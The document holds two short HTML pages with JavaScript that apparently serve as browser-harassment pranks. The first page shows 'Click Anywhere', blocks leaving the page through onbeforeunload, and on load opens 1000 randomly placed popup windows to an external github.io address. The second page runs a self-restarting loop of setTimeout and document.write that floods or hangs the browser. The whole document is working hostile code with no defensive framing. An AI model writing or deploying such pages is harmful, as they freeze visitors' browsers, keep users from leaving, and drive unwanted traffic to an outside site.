<!DOCTYPE html>
<html>
<head>
  <title>:3</title>
  <style>
    body {
      color: black;
      font-size: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
  </style>
</head>
<body>
  <p>Click Anywhere</p>
  <script type="text/javascript">
    onbeforeunload = () => true;

    function getRandomNumber(min, max) {
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function openMultiplePopups(count) {
      for (let i = 0; i < count; i++) {
        const url = 'https://uexedus.github.io/'; // Replace with the desired URL
        const randomWidth = getRandomNumber(200, 800);
        const randomHeight = getRandomNumber(200, 600);
        const randomLeft = getRandomNumber(0, window.innerWidth - randomWidth);
        const randomTop = getRandomNumber(0, window.innerHeight - randomHeight);
        window.open(url, 'popUpWindow' + i, `height=${randomHeight},width=${randomWidth},left=${randomLeft},top=${randomTop}`);
      }
    }

    {
      setTimeout(function(){
        openMultiplePopups(1000); // Change the number to open the desired count of popups
      }, 0);
    }
  </script>
</body>
</html>

<html>
<title>Array</title>
<body onload="myFunction()">
  <center>
    <p id="demo">:3</p>
  </center>
  <script>
    var globe;
    var i = 0;

    function myFunction() {
      var sl = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"];
     for (i = 0; i < sl.length; i++) {
        globe = sl[i];
        setTimeout(pk, 0); 
      }
    }

    function pk() {
      document.write(globe);
      i++;
      myFunction();
    }
  </script>
</body>

</html>
